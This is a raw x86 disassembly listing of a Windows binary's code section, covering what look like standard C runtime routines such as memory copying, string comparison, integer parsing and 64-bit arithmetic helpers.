  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
